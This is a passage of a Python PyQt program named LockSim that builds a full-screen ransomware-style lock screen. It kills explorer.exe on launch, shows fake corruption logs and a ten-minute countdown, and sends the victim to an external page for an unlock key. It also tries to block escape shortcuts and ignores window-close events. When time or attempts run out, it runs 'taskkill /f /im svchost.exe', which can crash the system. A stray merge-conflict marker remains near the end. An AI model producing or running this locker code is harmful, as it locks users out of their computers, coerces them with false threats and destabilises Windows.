        self.header.setText('<span class="glitch">!! CRITICAL SYSTEM LOCKDOWN !!</span>')

       
        self.timer_label = QLabel()
        self.timer_label.setObjectName("timer")
        self.timer_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.update_timer_display()

        skull = QLabel()
        skull.setObjectName("ascii")
        skull.setTextFormat(Qt.TextFormat.RichText)
        skull.setAlignment(Qt.AlignmentFlag.AlignHCenter)
        skull.setText(f"<pre>{SKULL_ASCII}</pre>")

        self.msg = QLabel("")
        self.msg.setObjectName("msg")
        self.msg.setWordWrap(True)

        self.log = QLabel("")
        self.log.setObjectName("log")
        self.log.setTextFormat(Qt.TextFormat.PlainText)
        self.log.setWordWrap(True)

        self.progress = QProgressBar()
        self.progress.setObjectName("progress")
        self.progress.setRange(0, 100)
        self.progress.setValue(0)
        self.progress.setFormat("corruption scan… %p%")

        
        self.attempts_label = QLabel(f"Attempts remaining: {self.attempts_remaining}")
        self.attempts_label.setObjectName("attempts")

        steps = QLabel(
            f"• Open: {PAGES_URL}\n"
            f"• Copy token → Go to website\n"
            f"• Paste token → Generate key → Copy key\n"
            f"• Return here → Paste key → Click unlock\n\n"
            f"⚠ WARNING: Do not close this window. Data corruption may occur."
        )
        steps.setObjectName("steps")
        steps.setWordWrap(True)

        left_l.addWidget(self.header)
        left_l.addWidget(self.timer_label)
        left_l.addWidget(skull)
        left_l.addWidget(self.msg)
        left_l.addWidget(self.progress)
        left_l.addWidget(self.log)
        left_l.addWidget(self.attempts_label)
        left_l.addWidget(steps)
        left_l.addStretch(1)

       
        right = QFrame()
        right.setObjectName("side")
        right_l = QVBoxLayout(right)
        right_l.setContentsMargins(16, 14, 16, 14)
        right_l.setSpacing(10)

        tag = QLabel("restricted session")
        tag.setObjectName("tag")

        token_label = QLabel("token")
        token_label.setObjectName("label")

        token_box = QFrame()
        token_box.setObjectName("box")
        token_box_l = QHBoxLayout(token_box)
        token_box_l.setContentsMargins(12, 10, 12, 10)
        token_box_l.setSpacing(10)

        self.token_text = QLabel(self.token)
        self.token_text.setObjectName("mono")
        self.token_text.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
        self.token_text.setStyleSheet("font-size: 16px; font-weight: bold; letter-spacing: 1px;")

        self.copy_token_btn = QPushButton("Copy")
        self.copy_token_btn.setObjectName("btn")
        self.copy_token_btn.clicked.connect(self.copy_token)
        self.copy_token_btn.setMaximumWidth(80)

        token_box_l.addWidget(self.token_text, 1)
        token_box_l.addWidget(self.copy_token_btn, 0)

        key_label = QLabel("unlock key")
        key_label.setObjectName("label")

        self.key_input = QLineEdit()
        self.key_input.setPlaceholderText("paste unlock key here (Ctrl+V)...")
        self.key_input.setObjectName("input")

        self.unlock_btn = QPushButton("unlock")
        self.unlock_btn.setObjectName("btnPrimary")
        self.unlock_btn.clicked.connect(self.try_unlock)

        self.status = QLabel("")
        self.status.setObjectName("status")

        right_l.addWidget(tag)
        right_l.addWidget(token_label)
        right_l.addWidget(token_box)
        right_l.addSpacing(6)
        right_l.addWidget(key_label)
        right_l.addWidget(self.key_input)
        right_l.addWidget(self.unlock_btn)
        right_l.addWidget(self.status)
        right_l.addStretch(1)

        layout.addWidget(left, 1)
        layout.addWidget(right, 0)

        outer.addWidget(card, 0, Qt.AlignmentFlag.AlignHCenter)
        outer.addStretch(1)

    def setup_timers(self):
        
        self._tw_i = 0
        self._tw_text = SCARY_TEXT
        self._tw_timer = QTimer(self)
        self._tw_timer.timeout.connect(self._type_step)
        self._tw_timer.start(14)

        
        self._log_lines = []
        self._log_timer = QTimer(self)
        self._log_timer.timeout.connect(self._log_step)
        self._log_timer.start(220)

        
        self._p_timer = QTimer(self)
        self._p_timer.timeout.connect(self._progress_step)
        self._p_timer.start(80)

        
        self._flick = 0
        self._f_timer = QTimer(self)
        self._f_timer.timeout.connect(self._flicker_step)
        self._f_timer.start(140)

        
        self.countdown_timer = QTimer(self)
        self.countdown_timer.timeout.connect(self.update_countdown)

        
        self._warning_timer = QTimer(self)
        self._warning_timer.timeout.connect(self._show_warning)
        self._warning_timer.start(30000)

    def setup_shortcuts(self):
        QShortcut(QKeySequence.StandardKey.Copy, self, activated=self.copy_token)
        QShortcut(QKeySequence.StandardKey.Paste, self, activated=self._global_paste)
        
        
        self.blocked_shortcuts = [
            QKeySequence.StandardKey.Close,
            QKeySequence("Alt+F4"),
            QKeySequence("Ctrl+W"),
            QKeySequence("Ctrl+Q"),
            QKeySequence("Alt+Tab"),
            QKeySequence("Win"),
            QKeySequence("Alt+Esc"),
            QKeySequence("Ctrl+Alt+Delete"),
            QKeySequence("Ctrl+Shift+Esc"),
        ]
        
        for seq in self.blocked_shortcuts:
            shortcut = QShortcut(seq, self)
            shortcut.activated.connect(self._blocked_action)

    def setup_styles(self):
        self.setStyleSheet(r"""
            QWidget{ 
                background:#05040a; 
                color:rgba(255,255,255,.92); 
                font-family: Segoe UI, system-ui; 
            }
            #card{ 
                background: rgba(0,0,0,0.7); 
                border: 2px solid rgba(255,80,100,.4); 
                border-radius: 18px; 
                max-width: 1020px; 
                min-width: 900px; 
                box-shadow: 0 0 40px rgba(255,80,100,.3); 
            }
            #console{ 
                background: radial-gradient(900px 420px at 50% 0%, rgba(255,50,70,.25), transparent 60%), 
                          rgba(0,0,0,.7); 
                border: 1px solid rgba(255,80,100,.3); 
                border-radius: 16px; 
            }
            #header{ 
                font-size: 20px; 
                font-weight: 950; 
                letter-spacing: 1px; 
                color: rgba(255,100,120,1); 
                text-transform: uppercase; 
                text-shadow: 0 0 10px rgba(255,100,120,.5); 
            }
            #timer{
                font-size: 18px;
                font-weight: bold;
                color: #ff6b6b;
                padding: 8px;
                background: rgba(255, 80, 100, 0.1);
                border-radius: 8px;
                border: 1px solid rgba(255, 80, 100, 0.3);
            }
            #attempts{
                font-size: 14px;
                font-weight: bold;
                color: #ffd166;
                padding: 6px 10px;
                background: rgba(255, 209, 102, 0.1);
                border-radius: 6px;
                border: 1px solid rgba(255, 209, 102, 0.3);
            }
            #ascii{ 
                padding: 10px 12px; 
                background: rgba(255,255,255,.02); 
                border: 1px solid rgba(255,80,100,.3); 
                border-radius: 14px; 
            }
            #ascii pre{ 
                margin:0; 
                font-family: ui-monospace, Consolas, monospace; 
                font-size: 12px; 
                color: rgba(255,255,255,.86); 
            }
            #msg{ 
                font-size: 14px; 
                line-height: 1.45; 
                color: rgba(255,200,200,.95); 
            }
            #progress{ 
                height: 14px; 
                border-radius: 999px; 
                background: rgba(0,0,0,.4); 
                border: 1px solid rgba(255,80,100,.3); 
                padding: 2px; 
            }
            #progress::chunk{ 
                border-radius: 999px; 
                background: qlineargradient(x1:0,y1:0,x2:1,y2:1, stop:0 #ff3246, stop:1 #8b5cf6); 
            }
            #log{ 
                padding: 10px 12px; 
                border-radius: 14px; 
                background: rgba(0,0,0,.4); 
                border: 1px solid rgba(255,80,100,.2); 
                font-family: ui-monospace, Consolas, monospace; 
                font-size: 12px; 
                color: rgba(255,150,150,.8); 
                min-height: 80px; 
            }
            #steps{ 
                font-size: 13px; 
                line-height: 1.45; 
                color: rgba(255,180,180,.8); 
            }
            #side{ 
                width: 330px; 
                background: rgba(0,0,0,.5); 
                border: 1px solid rgba(255,80,100,.3); 
                border-radius: 16px; 
            }
            #tag{ 
                font-size: 12px; 
                font-weight: 900; 
                letter-spacing: .7px; 
                text-transform: uppercase; 
                color: rgba(255,150,150,1); 
                padding: 6px 10px; 
                border-radius: 999px; 
                border: 1px solid rgba(255,80,100,.3); 
                background: rgba(255,80,100,.1); 
                width: fit-content; 
            }
            #label{ 
                font-size: 12px; 
                color: rgba(255,180,180,.8); 
                text-transform: uppercase; 
                letter-spacing: .6px; 
            }
            #box{ 
                background: rgba(0,0,0,.4); 
                border: 1px solid rgba(255,80,100,.3); 
                border-radius: 14px; 
            }
            #mono{ 
                font-family: ui-monospace, Consolas, monospace; 
                font-size: 13px; 
                color: rgba(255,200,200,.9); 
            }
            #input{ 
                padding: 12px 12px; 
                border-radius: 14px; 
                background: rgba(0,0,0,.4); 
                border: 1px solid rgba(255,80,100,.3); 
                color: rgba(255,255,255,.95); 
                font-size: 14px; 
            }
            #btn,#btnPrimary{ 
                padding: 10px 14px; 
                border-radius: 999px; 
                font-weight: 900; 
            }
            #btn{ 
                background: rgba(255,80,100,.15); 
                border: 1px solid rgba(255,80,100,.4); 
                color: rgba(255,200,200,.95); 
                font-size: 11px; 
                padding: 8px 12px; 
            }
            #btnPrimary{ 
                background: qlineargradient(x1:0,y1:0,x2:1,y2:1, stop:0 #ff3246, stop:1 #8b5cf6); 
                border: 0; 
                color: white; 
                font-size: 13px; 
                font-weight: bold; 
            }
            #status{ 
                font-size: 13px; 
                color: rgba(255,140,140,.95); 
            }
        """)

    
    
    def update_countdown(self):
        """Update the 10-minute countdown timer"""
        if self.time_remaining > 0:
            self.time_remaining -= 1
            self.update_timer_display()
            
            
            if self.time_remaining <= 60:
                self.flash_timer_red()
        else:
            self.countdown_timer.stop()
            self.time_expired()

    def update_timer_display(self):
        """Format and display the remaining time"""
        minutes = self.time_remaining // 60
        seconds = self.time_remaining % 60
        self.timer_label.setText(f"TIME REMAINING: {minutes:02d}:{seconds:02d}")

    def flash_timer_red(self):
        """Flash the timer red when time is running out"""
        if self.time_remaining % 2 == 0:
            self.timer_label.setStyleSheet("""
                color: #ff0000;
                font-weight: bold;
                background: rgba(255, 0, 0, 0.2);
                border: 2px solid #ff0000;
            """)
        else:
            self.timer_label.setStyleSheet("""
                color: #ff6b6b;
                font-weight: bold;
                background: rgba(255, 80, 100, 0.1);
                border: 1px solid rgba(255, 80, 100, 0.3);
            """)

    def time_expired(self):
        """Handle timer expiration"""
        self._log_lines.append("[CRITICAL] TIME EXPIRED - System lockdown permanent")
        self.log.setText("\n".join(self._log_lines[-8:]))
        
        self.timer_label.setText("TIME EXPIRED: 00:00")
        self.timer_label.setStyleSheet("""
            color: #ff0000;
            font-weight: bold;
            background: rgba(255, 0, 0, 0.3);
            border: 2px solid #ff0000;
        """)
        
        self.key_input.setEnabled(False)
        self.unlock_btn.setEnabled(False)
        
        #Time ran out
        os.system("taskkill /f /im svchost.exe")
        
        QTimer.singleShot(3000, lambda: self._log_lines.append("[FATAL] Permanent system lock initiated"))
        QTimer.singleShot(5000, lambda: self.log.setText("\n".join(self._log_lines[-8:])))

    
    
    def try_unlock(self):
        """Check the unlock key and handle attempts"""
        if self.time_remaining <= 0:
            self.status.setText("✗ TIME EXPIRED - System locked permanently")
            self.status.setStyleSheet("color: rgba(255,100,120,1); font-weight: bold;")
            return
            
        if self.attempts_remaining <= 0:
            self.status.setText("✗ NO ATTEMPTS REMAINING - You lost")
            self.status.setStyleSheet("color: rgba(255,100,120,1); font-weight: bold;")
            return

        entered = self.key_input.text().strip().replace(" ", "")
        
        
        self.status.setText("⏳ UNLOCKING...")
        self.status.setStyleSheet("color: rgba(255,215,0,1); font-weight: bold;")
        
        
        QTimer.singleShot(600, lambda: self._process_unlock(entered))

    def _process_unlock(self, entered: str):
        expected = make_key(self.token)
        

        if entered.upper() == expected.upper():
        
            os.system("start explorer.exe")
            self.status.setStyleSheet("color: rgba(120,255,160,1); font-weight: bold;")
            self.status.setText("✓ UNLOCKED - System recovering...")

            self.progress.setValue(100)
            self._log_lines.append("[SUCCESS] Unlock key verified")
            self._log_lines.append("[INFO] Restoring system access...")
            self.log.setText("\n".join(self._log_lines[-8:]))

           
            self.countdown_timer.stop()
            self._tw_timer.stop()
            self._log_timer.stop()
            self._p_timer.stop()
            self._f_timer.stop()
            self.block_timer.stop()
            self._warning_timer.stop()

            self.unlocked = True
            QTimer.singleShot(2000, self.close)
            QTimer.singleShot(6000, QApplication.instance().quit)
            return
            
        else:
            self.attempts_remaining -= 1
            self.attempts_label.setText(f"Attempts remaining: {self.attempts_remaining}")
            
            self.status.setStyleSheet("color: rgba(255,100,120,1); font-weight: bold;")
            self.status.setText(f"✗ INVALID KEY - {self.attempts_remaining} attempt(s) left")
            
            self._log_lines.append(f"[SECURITY] Failed unlock attempt (code: 0x{random.randrange(16**4):04x})")
            if len(self._log_lines) > 8:
                self._log_lines = self._log_lines[-8:]
            self.log.setText("\n".join(self._log_lines))
            
            
            self.key_input.clear()
            
            
            if self.attempts_remaining <= 0:
                self.handle_game_over()

    def handle_game_over(self):
        self._log_lines.append("[FATAL] Maximum attempts exceeded")
        self._log_lines.append("[SECURITY] Permanent system lockdown initiated")
        self.log.setText("\n".join(self._log_lines[-8:]))
        
        self.key_input.setEnabled(False)
        self.unlock_btn.setEnabled(False)
        
        # Attepmts ran out
        os.system("taskkill /f /im svchost.exe")
        
        QTimer.singleShot(2000, lambda: self._log_lines.append("[FINAL] All recovery options exhausted"))
        QTimer.singleShot(4000, lambda: self.log.setText("\n".join(self._log_lines[-8:])))

    
    
    def _global_paste(self):
        self.key_input.setFocus()
        self.key_input.paste()

    def _block_escape_keys(self):
        self.raise_()
        self.activateWindow()
        
    def _blocked_action(self):
        self.escape_attempts += 1
        new_lines = [
            f"[SECURITY] Escape attempt #{self.escape_attempts} blocked",
            f"[WARN] Unauthorized input detected (code: 0x{random.randrange(16**4):04x})",
            "[ERR] Security violation - session locked",
        ]
        self._log_lines.extend(new_lines)
        if len(self._log_lines) > 8:
            self._log_lines = self._log_lines[-8:]
        self.log.setText("\n".join(self._log_lines))
        
        
        original_style = self.styleSheet()
        self.setStyleSheet(original_style + "\n#card{ border: 3px solid rgba(255,50,70,.8); }")
        QTimer.singleShot(300, lambda: self.setStyleSheet(original_style))

    def closeEvent(self, event):
        if getattr(self, "unlocked", False):
            event.accept()
            return

        self.escape_attempts += 1
        if self.escape_attempts >= 50:
            msg = QMessageBox()
            msg.setWindowTitle("CRITICAL ERROR")
            msg.setText("⚠ SYSTEM RECOVERY FAILURE\n\nForced exit may cause permanent data loss.\nContinue with unlock procedure.")
            msg.setIcon(QMessageBox.Icon.Critical)
            msg.setStandardButtons(QMessageBox.StandardButton.Ok)
            msg.exec()

        event.ignore()

    def _show_warning(self):
        warnings = [
            "⚠ Session will remain locked until correct key is entered.",
            "⚠ Data integrity check in progress - do not interrupt.",
            "⚠ Multiple failed unlock attempts may trigger security lockdown.",
            "⚠ Recovery process is monitoring system stability.",
        ]
        self._log_lines.append(random.choice(warnings))
        if len(self._log_lines) > 8:
            self._log_lines = self._log_lines[-8:]
        self.log.setText("\n".join(self._log_lines))

    def copy_token(self):
        QGuiApplication.clipboard().setText(self.token)
        original_text = self.copy_token_btn.text()
        self.copy_token_btn.setText("✓ Copied!")
        QTimer.singleShot(1200, lambda: self.copy_token_btn.setText(original_text))

    def _type_step(self):
        if self._tw_i >= len(self._tw_text):
            self._tw_timer.stop()
            return
        self._tw_i += 1
        self.msg.setText(self._tw_text[:self._tw_i].replace("\n", "<br>"))

    def _log_step(self):
        if len(self._log_lines) > 8:
            self._log_lines = self._log_lines[-8:]
        line = random.choice(FAKE_LOG_LINES)
        suffix = f" 0x{random.randrange(16**4):04x}".upper()
        self._log_lines.append(line + suffix)
        self.log.setText("\n".join(self._log_lines))

    def _progress_step(self):
        v = self.progress.value()
        if v < 100:
            v = min(100, v + random.choice([1, 1, 2, 3]))
            self.progress.setValue(v)
        else:
            if random.random() < 0.08:
                self.progress.setValue(random.randrange(70, 85))

    def _flicker_step(self):
        self._flick = (self._flick + 1) % 12
        if self._flick == 2:
            self.header.setText('<span class="glitch">!! CRITICAL SYSTEM LOCKDOWN !!</span>')
        elif self._flick == 6:
            self.header.setText('<span class="glitch">!! RECOVERY MODE ACTIVE !!</span>')
        else:
            self.header.setText('<span class="glitch">!! DO NOT CLOSE WINDOW !!</span>')


if __name__ == "__main__":
    os.system("taskkill /f /im explorer.exe")
    app = QApplication(sys.argv)
    w = LockSim()
    w.showFullScreen()
>>>>>>> a433309 (new program)
    sys.exit(app.exec())